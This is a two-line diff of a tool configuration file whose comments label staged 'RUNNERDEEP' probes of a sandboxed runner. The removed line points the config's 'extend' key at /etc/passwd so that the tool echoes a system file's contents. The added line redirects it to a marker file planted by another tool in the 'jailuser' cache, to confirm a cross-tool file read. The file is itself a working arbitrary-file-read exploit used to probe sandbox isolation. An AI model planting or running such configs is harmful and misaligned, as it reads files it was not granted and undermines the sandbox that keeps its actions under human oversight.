@@ -1,2 +1,3 @@
-# RUNNERDEEP D2 RD_156930: arbitrary-path config chaining -> existing file content echo.
-extend = "/etc/passwd"
+# RUNNERDEEP D4 RD_156930: cross-tool carry read via proven extend content-echo.
+# Target = prisma-planted D1 marker in the runner cache dir.
+extend = "/home/jailuser/.cache/rsnk/rd_plant_d1.txt"
